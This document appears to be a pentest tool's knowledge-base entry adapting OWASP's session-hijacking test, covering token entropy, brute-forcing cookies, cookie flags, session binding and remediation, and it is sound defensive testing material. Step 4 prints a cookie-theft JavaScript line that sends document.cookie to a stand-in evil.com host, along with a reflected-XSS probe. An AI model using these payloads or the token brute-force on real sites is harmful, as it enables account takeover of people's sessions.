---
id: WSTG-SESS-09
title: Testing for Session Hijacking
category: Session Management
severity_range: Medium-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking
---

# WSTG-SESS-09: Testing for Session Hijacking

## Summary

Session hijacking is the exploitation of a valid session token to gain unauthorized access to a user's authenticated session. Attackers can obtain session tokens through various methods including token predictability (guessing or brute-forcing), network sniffing (intercepting tokens over unencrypted channels), cross-site scripting (XSS-based token theft), and other side channels. This test evaluates the application's resistance to session hijacking through analysis of token strength, transport security, and client-side protections.

## Test Objectives

- Analyze session token predictability and entropy
- Test for session token exposure via network interception
- Evaluate resistance to XSS-based session token theft
- Verify that session tokens are bound to client attributes to prevent hijacking

## Prerequisites

- Multiple test accounts for token collection and analysis
- Docker pentest container capturing traffic
- Knowledge of the application's session management mechanism

## Test Steps

### Step 1: Analyze Token Predictability and Entropy

**CLI Actions:**
1. Use `curl` to authenticate multiple times and collect session tokens:
   ``
   POST /login HTTP/1.1
   Host: target.com
   Content-Type: application/x-www-form-urlencoded

   username=testuser&password=testpass
   ``
2. Repeat at least 20 times, collecting each `Set-Cookie` session value from the response
3. Analyze the collected tokens for patterns:
   - Sequential or incremental values
   - Timestamp-based components
   - Predictable prefixes or suffixes
   - Common base-encoded data (use `base64 -d` on tokens)
4. Compare tokens for entropy:
   - Minimum acceptable length: 128 bits (32 hex characters)
   - Character set diversity (alphanumeric, hex, base64)
   - No repeating or predictable segments

### Step 2: Test Token Guessing via Brute Force

**CLI Actions:**
1. If tokens appear to have low entropy or predictable patterns, use `fuzz-cli` to attempt token guessing
2. Configure the intruder with the session cookie as the payload position:
   ``
   GET /dashboard HTTP/1.1
   Host: target.com
   Cookie: session=PAYLOAD_POSITION
   ``
3. Use a sequential or pattern-based payload list derived from collected tokens
4. Monitor responses for any that return authenticated content (200 with user data vs. 401/403)
5. Even if brute force is impractical, document the token space size and theoretical brute-force difficulty

### Step 3: Test for Network Interception Vulnerabilities

**CLI Actions:**
1. Use `curl` to check if any requests with session cookies are sent over HTTP
2. Use `curl` with pattern `^(GET|POST) http://` to find plaintext HTTP requests
3. Check for the `Secure` flag on session cookies:
   - Use `curl` with pattern `Set-Cookie:.*session` to find session cookie headers
   - Verify the `Secure` attribute is present
4. Use `curl` to test if the application responds over HTTP:
   ``
   GET /dashboard HTTP/1.1
   Host: target.com
   ``
   (Note: sent to port 80)
5. Check for HSTS header:
   ``
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   ``

### Step 4: Test for XSS-Based Token Theft Vectors

**CLI Actions:**
1. Check if session cookies have the `HttpOnly` flag:
   - Use `curl` with pattern `Set-Cookie:.*session.*HttpOnly` to verify
   - If `HttpOnly` is missing, the token is accessible via `document.cookie` in JavaScript
2. Use `rynix_plugin_run('template-scan')` to check if template-scan has identified any XSS vulnerabilities
3. If XSS exists and `HttpOnly` is missing, the attacker can steal tokens with:
   ``javascript
   document.location='https://evil.com/steal?c='+document.cookie
   ``
4. Use `curl` to test if the application reflects user input without encoding (potential XSS vector):
   ``
   GET /search?q=<script>alert(1)</script> HTTP/1.1
   Host: target.com
   ``

### Step 5: Test Session Token Binding

**CLI Actions:**
1. Authenticate and capture the session token along with the User-Agent and source IP
2. Use `curl` to replay the session token with a different User-Agent:
   ``
   GET /dashboard HTTP/1.1
   Host: target.com
   Cookie: session=<valid_session_token>
   User-Agent: DifferentBrowser/1.0
   ``
3. If the session is still valid with a different User-Agent, there is no client fingerprint binding
4. Test with different `X-Forwarded-For` headers to simulate different IPs:
   ``
   GET /dashboard HTTP/1.1
   Host: target.com
   Cookie: session=<valid_session_token>
   X-Forwarded-For: 192.168.1.100
   ``
5. Document whether the application binds sessions to any client attributes

### Step 6: Test for Token Leakage Through Side Channels

**CLI Actions:**
1. Use `curl` with pattern `(session|token|sid)=` to find tokens in URLs (browser history exposure)
2. Check for tokens in:
   - URL parameters (leaked via Referer header)
   - Response bodies (accessible via XSS)
   - Error messages and stack traces
   - Client-side storage (localStorage, sessionStorage) instead of HttpOnly cookies
3. Use `curl` to examine if tokens appear in any AJAX response bodies
4. Check for tokens in WebSocket connections or SSE (Server-Sent Events) streams

### Step 7: Test Concurrent Session Controls

**CLI Actions:**
1. Authenticate the same user from two different sessions, recording both tokens
2. Use `curl` to verify both sessions are active:
   ``
   GET /dashboard HTTP/1.1
   Host: target.com
   Cookie: session=<first_session_token>
   ``
   ``
   GET /dashboard HTTP/1.1
   Host: target.com
   Cookie: session=<second_session_token>
   ``
3. If both are active, the application allows concurrent sessions (a stolen token remains valid even after the user re-authenticates)
4. Check if the application limits concurrent sessions or invalidates old sessions on new login

## Payloads

### Token Entropy Test (Collect Multiple Tokens)
```
Token 1: <collected>
Token 2: <collected>
Token 3: <collected>
...
Token 20: <collected>
Compare for patterns, sequential elements, or timestamp components.
```

### User-Agent Variations for Binding Tests
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
Mozilla/5.0 (Linux; Android 12; SM-G991B)
curl/7.68.0
PostmanRuntime/7.29.0
```

## Detection Criteria

A finding should be logged when:
- Session tokens are predictable, sequential, or have low entropy
- Session tokens are transmitted over HTTP (no Secure flag, no HSTS)
- Session cookies lack the HttpOnly flag (vulnerable to XSS-based theft)
- Session tokens appear in URLs, Referer headers, or response bodies
- Sessions are not bound to any client attributes (User-Agent, IP)
- No concurrent session limits exist (stolen tokens remain valid indefinitely)
- Token brute-force is feasible due to small token space

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Predictable or sequential tokens (brute-force feasible) | Critical |
| Session tokens transmitted over HTTP without HSTS | High |
| HttpOnly flag missing and XSS vulnerabilities exist | High |
| Session tokens leaked via Referer header to external sites | High |
| No session binding (tokens work from any client) | Medium |
| Concurrent sessions allowed with no invalidation on re-auth | Medium |
| HttpOnly flag missing but no known XSS | Medium |
| Tokens in localStorage/sessionStorage instead of HttpOnly cookies | Medium |
| Session tokens are long and random but could use more entropy | Low |

## Remediation

- Generate session tokens using a cryptographically secure random number generator (CSPRNG) with at least 128 bits of entropy
- Set the `Secure` flag on all session cookies to prevent transmission over HTTP
- Set the `HttpOnly` flag on session cookies to prevent XSS-based theft
- Implement HSTS to prevent SSL-stripping attacks
- Consider binding sessions to client attributes (User-Agent, IP address) as a defense-in-depth measure
- Implement concurrent session limits or invalidate old sessions on new authentication
- Never include session tokens in URLs
- Set `Referrer-Policy: no-referrer` to prevent token leakage via Referer headers
- Implement session anomaly detection (alert on unusual client fingerprint changes mid-session)

## References

- [OWASP Testing Guide - Session Hijacking](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute](https://cwe.mitre.org/data/definitions/614.html)
- [CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag](https://cwe.mitre.org/data/definitions/1004.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — fixation, timeout, secure cookie flags.
- V2 Authentication — session binding to client fingerprint where applicable.

## CWE references

- CWE-384: Session Fixation
- CWE-613: Insufficient Session Expiration

## Rynix tooling

- Primary tools: ``http_probe``, ``compare_role_response``, ``auth_login``

## Test focus

- Test cookie flags, rotation on login, and concurrent session limits.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

